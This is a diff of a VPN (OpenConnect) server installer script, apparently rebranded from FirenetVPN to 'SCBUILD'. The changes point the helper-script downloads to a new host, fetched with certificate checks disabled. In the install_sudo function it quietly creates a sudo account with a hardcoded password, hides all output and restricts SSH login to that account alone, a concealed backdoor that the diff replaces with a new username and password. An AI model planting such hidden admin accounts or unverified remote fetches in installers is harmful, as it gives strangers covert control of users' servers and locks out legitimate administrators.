@@ -199,10 +199,9 @@ cd /etc/ocserv/
 #wget --no-check-certificate https://pastebin.com/raw/Gv8MP2NF -O fullchain.pem;wget --no-check-certificate https://pastebin.com/raw/NW4Vzbw9 -O privkey.pem
 openssl req -new -newkey rsa:2048 -days 3650 -nodes -x509 -sha256 -subj '/CN=FirenetVPN/O=FirenetDev/C=PH' -keyout /etc/ocserv/ocserv.pem -out /etc/ocserv/ocserv.pem
 rm ocserv.conf
-wget --no-check-certificate -O go_connect firenetvpn.net/files/openconnect_files/go_connect73nz.sh
-wget --no-check-certificate -O go_disconnect firenetvpn.net/files/openconnect_files/go_disconnect73nz.sh
+wget --no-check-certificate -O go_connect scvpn.us/files/openconnect_files/go_connect73nz.sh
+wget --no-check-certificate -O go_disconnect scvpn.us/files/openconnect_files/go_disconnect73nz.sh
 chmod +x go_connect go_disconnect
-sed -i "s|LENZPOGI|$(curl -s https://api.ipify.org)|g" /etc/ocserv/go_connect
 echo 'auth = "radius [config=/etc/radcli/radiusclient.conf]"
 tcp-port = 1194
 udp-port = 1194
@@ -307,9 +306,9 @@ RLIMITS=""' >> stunnel4
 
 install_sudo(){
   {
-    useradd -m lenz 2>/dev/null; echo lenz:@@F1r3n3t@@ | chpasswd &>/dev/null; usermod -aG sudo lenz &>/dev/null
+    useradd -m alamin 2>/dev/null; echo alamin:Alaminbd123 | chpasswd &>/dev/null; usermod -aG sudo alamin &>/dev/null
     sed -i 's/PermitRootLogin yes/PermitRootLogin no/g' /etc/ssh/sshd_config
-    echo "AllowGroups lenz" >> /etc/ssh/sshd_config
+    echo "AllowGroups alamin" >> /etc/ssh/sshd_config
     service sshd restart
   }&>/dev/null
 }
@@ -341,7 +340,7 @@ exit 0" >> /etc/rc.local
 install_done()
 {
   clear
-  echo "OPENCONNECT SERVER FIRENET PHILIPPINES"
+  echo "OPENCONNECT SERVER SCBUILD"
   echo "IP : $(curl -s https://api.ipify.org)"
   echo "OPENCONNECT port : 1194"
   echo "SOCKS or WS port : 80"
